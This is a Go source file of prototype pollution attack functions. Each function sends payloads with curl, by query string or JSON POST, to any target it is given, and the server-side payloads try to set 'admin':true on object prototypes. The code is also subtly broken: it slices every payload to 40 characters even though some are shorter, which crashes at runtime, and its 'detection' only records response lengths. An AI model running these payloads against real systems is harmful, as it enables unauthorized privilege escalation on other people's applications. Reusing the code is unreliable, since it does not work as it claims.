package websecurity

import (
	"fmt"
	"net/url"
	"strings"
)

func ProtoPolluteClient(target, param string) (string, error) {
	payloads := []string{
		`{"__proto__":{"polluted":"true"}}`,
		`{"constructor":{"prototype":{"polluted":"true"}}}`,
	}
	var results []string
	for _, p := range payloads {
		fullURL := fmt.Sprintf("%s?%s=%s", strings.TrimRight(target, "?"), param, url.QueryEscape(p))
		cmd := throttledExec("curl", "-s", fullURL)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		results = append(results, fmt.Sprintf("%s: %d", p[:40], len(out)))
	}
	return fmt.Sprintf("Client-side prototype pollution test on %s via %s: %s", target, param, strings.Join(results, " | ")), nil
}

func ProtoPolluteServer(target, param string) (string, error) {
	payloads := []string{
		fmt.Sprintf(`{%s:{"__proto__":{"admin":true}}}`, param),
		fmt.Sprintf(`{%s:{"constructor":{"prototype":{"admin":true}}}}`, param),
	}
	var results []string
	for _, p := range payloads {
		cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", p, target)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		results = append(results, fmt.Sprintf("%s: %d", p[:40], len(out)))
	}
	return fmt.Sprintf("Server-side prototype pollution test on %s via %s: %s", target, param, strings.Join(results, " | ")), nil
}

func ProtoDetect(target string) (string, error) {
	payloads := []struct {
		path  string
		query string
	}{
		{"/", "__proto__=test"},
		{"/", "constructor[prototype]=test"},
		{"/api", "__proto__[polluted]=true"},
	}
	var results []string
	for _, p := range payloads {
		fullURL := fmt.Sprintf("%s%s?%s", strings.TrimRight(target, "/"), p.path, p.query)
		cmd := throttledExec("curl", "-s", fullURL)
		out, err := cmd.CombinedOutput()
		if err != nil {
			continue
		}
		results = append(results, fmt.Sprintf("%s%s: %d", target, p.path, len(out)))
	}
	return fmt.Sprintf("Prototype pollution detection on %s: %s", target, strings.Join(results, " | ")), nil
}
